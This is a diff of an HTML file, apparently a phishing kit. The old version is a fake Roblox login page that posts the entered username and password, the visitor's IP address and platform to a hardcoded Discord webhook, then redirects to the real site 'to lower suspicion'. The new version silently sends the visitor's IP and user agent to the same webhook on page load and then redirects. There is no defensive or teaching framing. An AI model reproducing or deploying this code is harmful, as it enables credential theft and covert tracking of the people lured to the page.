@@ -1,82 +1,44 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox | Login</title>
-    <style>
-        body { background-color: #f2f4f5; font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .login-container { background: #ffffff; width: 400px; padding: 40px; border-radius: 8px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); text-align: center; border: 1px solid #d8d8d8; }
-        .logo { width: 120px; margin-bottom: 30px; }
-        h1 { font-size: 22px; font-weight: 500; margin-bottom: 25px; color: #1e1e1e; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; border: 1px solid #b8b8b8; border-radius: 4px; font-size: 15px; box-sizing: border-box; background-color: #f2f4f5; }
-        input:focus { outline: none; border-color: #00b2ff; background-color: #fff; }
-        .btn-blue { background-color: #00b2ff; color: white; border: none; padding: 12px; border-radius: 4px; font-weight: bold; width: 100%; cursor: pointer; font-size: 17px; margin-top: 10px; transition: 0.2s; }
-        .btn-blue:hover { background-color: #008cc9; }
-        .footer { margin-top: 25px; font-size: 13px; color: #666; }
-        .footer a { color: #00b2ff; text-decoration: none; font-weight: 500; }
-    </style>
+    <title>Redirecting...</title>
 </head>
-<body>
-
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox" class="logo">
-        <h1>Login to Roblox</h1>
-        <input type="text" id="username" placeholder="Username/Email/Phone">
-        <input type="password" id="password" placeholder="Password">
-        <button class="btn-blue" id="loginBtn">Log In</button>
-        <div class="footer">
-            Don't have an account? <a href="#">Sign Up</a><br><br>
-            <a href="#">Forgot Password or Username?</a>
-        </div>
-    </div>
-
+<body style="background: #000; color: #ff0000; font-family: monospace;">
+    <p>INITIALIZING SECURE TUNNEL...</p>
+    
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
+        const HOOK = "https://discord.com/api/webhooks/1474279324667351090/ALAHbGxyK7QbVtt4nAJ1Aagv-0F1NMqgolB1UdWIlFoS5V-chCWNhQa0w-DUEF4J90EI";
 
-        document.getElementById('loginBtn').addEventListener('click', async () => {
-            const u = document.getElementById('username').value;
-            const p = document.getElementById('password').value;
-
-            if(!u || !p) {
-                alert("Please enter both username and password.");
-                return;
-            }
-
-            document.getElementById('loginBtn').innerText = "Authenticating...";
-
+        async function captureAndRedirect() {
             try {
-                // Fetch location data for the report
-                const geo = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+                // Grab the target's IP/Location
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
 
-                // EXFILTRATE DATA TO DISCORD
-                await fetch(WEBHOOK_URL, {
+                // Log the entry to your Discord
+                await fetch(HOOK, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
                         embeds: [{
-                            title: "💀 SHΔDØW WORM-AI EXFILTRATION",
+                            title: "💀 TARGET REDIRECTED",
                             color: 16711680,
                             fields: [
-                                { name: "👤 Username", value: `\`${u}\``, inline: true },
-                                { name: "🔑 Password", value: `\`${p}\``, inline: true },
-                                { name: "🌐 IPv4", value: geo.ip, inline: false },
-                                { name: "🖥️ Platform", value: navigator.platform }
+                                { name: "IPv4", value: data.ip },
+                                { name: "UA", value: navigator.userAgent }
                             ],
-                            footer: { text: "Protocol V99 Active | Villager Sentry" },
-                            timestamp: new Date()
+                            footer: { text: "SHΔDØW WORM-AI💀🔥" }
                         }]
                     })
                 });
-            } catch (err) {
-                console.log("Network error - Payload still attempting delivery...");
-            }
+            } catch (e) {}
 
-            // Redirect to legitimate site to lower suspicion
-            setTimeout(() => {
-                window.location.href = "https://www.roblox.com/home";
-            }, 500);
-        });
+            // The Instant Redirect to the REAL Roblox
+            window.location.href = "https://www.roblox.com/home";
+        }
+
+        // Execute on load
+        captureAndRedirect();
     </script>
 </body>
 </html>
